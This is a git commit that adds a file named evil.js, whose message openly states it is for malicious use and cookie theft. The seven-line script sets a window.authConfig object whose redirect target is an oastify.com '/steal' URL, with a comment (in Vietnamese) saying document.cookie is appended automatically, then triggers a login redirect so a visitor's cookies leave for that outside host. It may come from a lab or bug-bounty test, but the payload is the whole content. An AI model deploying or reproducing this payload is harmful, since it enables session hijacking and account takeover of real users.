08510049dd9fdf3880f586cabe431d6642a72529
nguyenkhai98 <51147179+nguyenkhai98@users.noreply.github.com>
2026-03-16 23:02:49 +0700

    Create evil.js with authConfig for malicious use
    Added authentication configuration for cookie theft.

---
+++ evil.js
@@ -0,0 +1,7 @@
+window.authConfig = {
+    dataset: {
+        next: 'https://ztwd6th606h2292kadlx6n681z7qvgj5.oastify.com/steal',
+        append: 'true'  // ← tự động append document.cookie vào URL!
+    }
+};
+window.Auth.loginRedirect({});
